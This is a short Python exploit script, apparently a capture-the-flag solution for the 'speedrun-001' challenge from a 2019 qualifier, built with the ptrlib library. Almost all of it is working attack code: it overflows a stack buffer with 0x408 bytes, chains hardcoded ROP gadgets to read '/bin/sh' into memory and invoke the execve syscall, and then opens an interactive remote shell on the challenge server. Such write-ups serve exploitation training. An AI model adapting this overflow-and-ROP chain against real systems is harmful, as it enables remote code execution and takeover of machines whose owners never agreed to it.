from ptrlib import *

elfpath = "./speedrun-001"

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
sock = Socket("speedrun-001.quals2019.oooverflow.io", 31337)
elf = ELF(elfpath)
#sock = Process(elfpath)

addr_read = 0x4498a0
bss = 0x6b6000

rop_pop_rdi = 0x00400686
rop_pop_rsi = 0x004101f3
rop_pop_rax = 0x00415664
rop_pop_rdx = 0x004498b5
rop_syscall = 0x0040129c

payload = b'A' * 0x408
payload += p64(rop_pop_rdi)
payload += p64(0)
payload += p64(rop_pop_rsi)
payload += p64(bss)
payload += p64(rop_pop_rdx)
payload += p64(8)
payload += p64(addr_read)
payload += p64(rop_pop_rdi)
payload += p64(bss)
payload += p64(rop_pop_rsi)
payload += p64(0)
payload += p64(rop_pop_rdx)
payload += p64(0)
payload += p64(rop_pop_rax)
payload += p64(59)
payload += p64(rop_syscall)
#payload += b'A' * 

sock.sendline(payload)

from time import sleep
sleep(1)
sock.send("/bin/sh")

sock.interactive()
